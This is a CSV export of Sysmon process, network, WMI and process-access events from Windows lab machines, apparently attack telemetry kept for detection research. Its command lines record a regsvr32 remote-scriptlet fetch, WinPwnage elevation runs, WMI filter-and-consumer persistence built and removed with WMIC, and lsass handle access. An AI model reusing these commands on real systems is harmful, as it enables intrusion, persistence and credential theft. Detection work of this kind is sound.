,Catalog,Category,Channel,Computer,Correlation,EventID,EventRecordID,Execution_ProcessID,Execution_ThreadID,Guid,Installer,Keywords,Level,Lspname,Opcode,Provider_Guid,Provider_Name,Security_UserID,Task,TimeCreated_SystemTime,Version,Commandline,Company,Currentdirectory,Description,Fileversion,Hashes,Image,Integritylevel,Logonguid,Logonid,Parentcommandline,Parentimage,Parentprocessguid,Parentprocessid,Processguid,Processid,Product,Rulename,Terminalsessionid,User,Utctime,Creationutctime,Targetfilename,Details,Eventtype,Targetobject,Imageloaded,Signature,Signaturestatus,Signed,Destinationhostname,Destinationip,Destinationisipv6,Destinationport,Destinationportname,Initiated,Protocol,Sourcehostname,Sourceip,Sourceisipv6,Sourceport,Sourceportname,Originalfilename,Destination,Name,Operation,Type,Consumer,Filter,Eventnamespace,Query,Calltrace,Grantedaccess,Sourceimage,Sourceprocessguid,Sourceprocessid,Sourcethreadid,Targetimage,Targetprocessguid,Targetprocessid
25,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7564,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:26.999112900Z,5,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmp7792.tmp""",Microsoft Corporation,C:\Windows\system32\,Visual Basic Command Line Compiler,8.0.50727.5483,"SHA1=BE642993EFE69E35F3C17AC5630E8EE3958D9A1E,MD5=1672D0478049ABDAF0197BE64A7F867F,SHA256=C67F217DA287D8CEF48FA9E9DEE971D59D7EFABBD0C7F700664D7970D68B52EF,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,{365ABB72-1E54-5D04-0000-0010B7B30C00},1724,{365ABB72-1E5E-5D04-0000-0010EF5E0D00},2980,Microsoft® Visual Studio® 2005,,2,IEWIN7\IEUser,2019-06-14 22:23:26.983,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
26,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7570,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:53.358487900Z,5,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},Microsoft Corporation,C:\Windows\system32\,COM Surrogate,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA256=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8829",C:\Windows\System32\dllhost.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-9C16-5D04-0000-001006790000},616,{365ABB72-1E79-5D04-0000-0010EADE0E00},3284,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:53.342,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
27,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17285,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:02:49.160591100Z,5,C:\Windows\System32\mobsync.exe -Embedding,Microsoft Corporation,C:\Windows\system32\,Microsoft Sync Center,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=02A887DF2F485A19A051AF0F3D01DAC006DD9A83,MD5=CCA67BD391CFC9F036323B2522887A6A,SHA256=79F5BC1AD13A5575A52D39A000D0873B31865659B5EFC66A7FEF5E43E54C38B9,IMPHASH=8B7E2EE81565F21F95BADB244F9C56E6",C:\Windows\System32\mobsync.exe,Medium,{365ABB72-B0EC-5CD9-0000-00201D340100},0x000000000001341d,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-B0EB-5CD9-0000-00108D760000},596,{365ABB72-B147-5CD9-0000-00109D4F0B00},3828,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:02:47.527,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
28,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17286,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:03:19.681478000Z,5,/c notepad.exe,Microsoft Corporation,C:\Windows\system32\,Windows Command Processor,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",C:\Windows\System32\cmd.exe,High,{365ABB72-B0EC-5CD9-0000-0020DE330100},0x00000000000133de,C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\System32\svchost.exe,{365ABB72-B0EC-5CD9-0000-0010D9D20000},944,{365ABB72-B167-5CD9-0000-0010EE150C00},2372,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:03:19.482,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
29,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17287,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:03:19.681478000Z,5,/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll,Microsoft Corporation,C:\Windows\system32\,Microsoft(C) Register Server,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583",C:\Windows\System32\regsvr32.exe,Medium,{365ABB72-B0EC-5CD9-0000-00201D340100},0x000000000001341d,C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\System32\svchost.exe,{365ABB72-B0EC-5CD9-0000-0010D9D20000},944,{365ABB72-B167-5CD9-0000-001062160C00},2476,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:03:19.497,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17288,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:03:19.895876800Z,5,notepad.exe,Microsoft Corporation,C:\Windows\system32\,Notepad,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3",C:\Windows\System32\notepad.exe,High,{365ABB72-B0EC-5CD9-0000-0020DE330100},0x00000000000133de,/c notepad.exe,C:\Windows\System32\cmd.exe,{365ABB72-B167-5CD9-0000-0010EE150C00},2372,{365ABB72-B167-5CD9-0000-00109D240C00},2584,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-13 18:03:19.727,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
31,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,3,17289,276,2056,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,3,2019-05-13T18:03:21.212898000Z,5,,,,,,,C:\Windows\System32\regsvr32.exe,,,,,,,,{365ABB72-B167-5CD9-0000-001062160C00},2476,,,,IEWIN7\IEUser,2019-05-13 18:03:20.485,,,,,,,,,,,151.101.128.133,false,443,https,true,tcp,IEWIN7,10.0.2.15,false,49159,,,,,,,,,,,,,,,,,,,
32,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,17292,276,1000,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-13T18:05:18.692037600Z,5,wmiadap.exe /F /T /R,Microsoft Corporation,C:\Windows\system32\,WMI Reverse Performance Adapter Maintenance Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=DC6DC543EAC398DE6821325BFF3625C1CFC8EC3D,MD5=52799EAD792B0E9AE7FD4BA5BD18FE5C,SHA256=BE4838F4DB23D56CF75730DD36451C5F0F2ACA36B8A74844E7675DC5D5AD0C58,IMPHASH=FAAD498DDAEF07E1AF22EEF06D02AE2C",C:\Windows\System32\wbem\WMIADAP.exe,System,{365ABB72-B0EB-5CD9-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\svchost.exe -k netsvcs,C:\Windows\System32\svchost.exe,{365ABB72-B0EC-5CD9-0000-0010D9D20000},944,{365ABB72-B1DE-5CD9-0000-0010715B0D00},1188,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-05-13 18:05:18.676,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33,,,Microsoft-Windows-Sysmon/Operational,MSEDGEWIN10,,1,380456,3312,3928,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2020-09-10T17:48:47.077612400Z,5,c:\windows\system32\cmd.exe,Microsoft Corporation,c:\windows\system32\,Windows Command Processor,10.0.17763.592 (WinBuild.160101.0800),"SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",C:\Windows\System32\cmd.exe,System,{747F3D96-66F8-5F5A-E703-000000000000},0x00000000000003e7,\SystemRoot\System32\smss.exe,C:\Windows\System32\smss.exe,{747F3D96-66F4-5F5A-0300-00000000F600},300,{747F3D96-66F7-5F5A-0500-00000000F600},388,Microsoft® Windows® Operating System,-,0,NT AUTHORITY\SYSTEM,2020-09-10 17:48:39.678,,,,,,,,,,,,,,,,,,,,,,Cmd.Exe,,,,,,,,,,,,,,,,,
34,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16108,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:57:49.903159600Z,5,python  winpwnage.py -u elevate -5 -p c:\Windows\System32\cmd.exe,?,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,?,?,"SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5",C:\Python27\python.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,"""C:\Windows\System32\cmd.exe"" ",C:\Windows\System32\cmd.exe,{365ABB72-0C15-5CD7-0000-0010FB1C1500},2404,{365ABB72-0D1D-5CD7-0000-001020EF1500},3140,?,,1,IEWIN7\IEUser,2019-05-11 17:57:49.903,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
35,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16109,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:22.809409600Z,5,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,?,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,?,?,"SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5",C:\Python27\python.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,"""C:\Windows\System32\cmd.exe"" ",C:\Windows\System32\cmd.exe,{365ABB72-0C15-5CD7-0000-0010FB1C1500},2404,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,?,,1,IEWIN7\IEUser,2019-05-11 17:58:22.793,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
36,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16110,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:23.215659600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer CREATE Name=""BotConsumer23"", ExecutablePath=""c:\Windows\System32\cmd.exe"", CommandLineTemplate=""c:\Windows\System32\cmd.exe""",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D3F-5CD7-0000-0010DB251600},3184,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:23.200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
37,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,20,16111,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,20,2019-05-11T17:58:23.340659600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:23.340,,,,WmiConsumerEvent,,,,,,,,,,,,,,,,,,," ""c:\\Windows\\System32\\cmd.exe"""," ""BotConsumer23""",Created,Command Line,,,,,,,,,,,,,
38,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,21,16112,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,21,2019-05-11T17:58:23.418784600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:23.418,,,,WmiBindingEvent,,,,,,,,,,,,,,,,,,,,,Created,," ""CommandLineEventConsumer.Name=\""BotConsumer23\"""""," ""__EventFilter.Name=\""BotFilter82\""""",,,,,,,,,,,
39,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16113,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:23.450034600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""BotFilter82""', Consumer='CommandLineEventConsumer.Name=""BotConsumer23""'",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D3F-5CD7-0000-00108B381600},3196,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:23.356,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
40,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16114,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:23.590659600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter CREATE Name=""BotFilter82"", EventNameSpace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D3F-5CD7-0000-001089471600},1616,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:23.450,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
41,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,19,16115,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,19,2019-05-11T17:58:39.746909600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:39.746,,,,WmiFilterEvent,,,,,,,,,,,,,,,,,,,," ""BotFilter82""",Created,,,," ""root\\cimv2"""," ""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",,,,,,,,,
42,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16116,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:50.090659600Z,5,c:\Windows\System32\cmd.exe,Microsoft Corporation,C:\Windows\system32\,Windows Command Processor,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",C:\Windows\System32\cmd.exe,System,{365ABB72-8693-5CD7-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\wbem\WmiPrvSE.exe,{365ABB72-0D3F-5CD7-0000-00107F541600},3212,{365ABB72-0D5A-5CD7-0000-001069031700},2544,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-05-11 17:58:50.075,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
43,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,10,16117,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,10,2019-05-11T17:58:54.762534600Z,3,,,,,,,,,,,,,,,,,,,,,2019-05-11 17:58:54.762,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\SYSTEM32\ntdll.dll+4591c|C:\Windows\system32\KERNELBASE.dll+8185|c:\python27\DLLs\_ctypes.pyd+ed6a|c:\python27\DLLs\_ctypes.pyd+d9d6|c:\python27\DLLs\_ctypes.pyd+999e|c:\python27\DLLs\_ctypes.pyd+a1ce|c:\python27\DLLs\_ctypes.pyd+5b71|C:\Windows\system32\python27.dll+8f14c|C:\Windows\system32\python27.dll+113384|C:\Windows\system32\python27.dll+112f24|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12,0x00001410,c:\python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,2796,C:\Windows\system32\winlogon.exe,{365ABB72-8693-5CD7-0000-0010F4570000},444
44,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,10,16118,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,10,2019-05-11T17:58:54.762534600Z,3,,,,,,,,,,,,,,,,,,,,,2019-05-11 17:58:54.762,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\SYSTEM32\ntdll.dll+4591c|C:\Windows\system32\KERNELBASE.dll+8185|c:\python27\DLLs\_ctypes.pyd+ed6a|c:\python27\DLLs\_ctypes.pyd+d9d6|c:\python27\DLLs\_ctypes.pyd+999e|c:\python27\DLLs\_ctypes.pyd+a1ce|c:\python27\DLLs\_ctypes.pyd+5b71|C:\Windows\system32\python27.dll+8f14c|C:\Windows\system32\python27.dll+113384|C:\Windows\system32\python27.dll+112f24|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12|C:\Windows\system32\python27.dll+110c7e|C:\Windows\system32\python27.dll+113001|C:\Windows\system32\python27.dll+112f12,0x00001410,c:\python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,2796,C:\Windows\system32\lsass.exe,{365ABB72-8693-5CD7-0000-0010765E0000},492
45,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16119,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:54.887534600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer WHERE Name=""BotConsumer23"" DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-0010A1141700},2432,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.793,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
46,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,20,16120,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,20,2019-05-11T17:58:54.903159600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:54.903,,,,WmiConsumerEvent,,,,,,,,,,,,,,,,,,," ""c:\\Windows\\System32\\cmd.exe"""," ""BotConsumer23""",Deleted,Command Line,,,,,,,,,,,,,
47,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,19,16121,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,19,2019-05-11T17:58:54.981284600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:54.981,,,,WmiFilterEvent,,,,,,,,,,,,,,,,,,,," ""BotFilter82""",Deleted,,,," ""root\\cimv2"""," ""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",,,,,,,,,
48,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,16122,2032,2020,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-11T17:58:55.028159600Z,5,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter WHERE Name=""BotFilter82"" DELETE",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,WMI Commandline Utility,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443",C:\Windows\System32\wbem\WMIC.exe,High,{365ABB72-0807-5CD7-0000-002091450100},0x0000000000014591,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,C:\Python27\python.exe,{365ABB72-0D3E-5CD7-0000-0010680E1600},1832,{365ABB72-0D5E-5CD7-0000-0010E6241700},4084,Microsoft® Windows® Operating System,,1,IEWIN7\IEUser,2019-05-11 17:58:54.918,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
49,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,21,16123,2032,4092,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,21,2019-05-11T17:58:55.090659600Z,3,,,,,,,,,,,,,,,,,,,,IEWIN7\IEUser,2019-05-11 17:58:55.090,,,,WmiBindingEvent,,,,,,,,,,,,,,,,,,,,,Deleted,," ""CommandLineEventConsumer.Name=\""BotConsumer23\"""""," ""__EventFilter.Name=\""BotFilter82\""""",,,,,,,,,,,
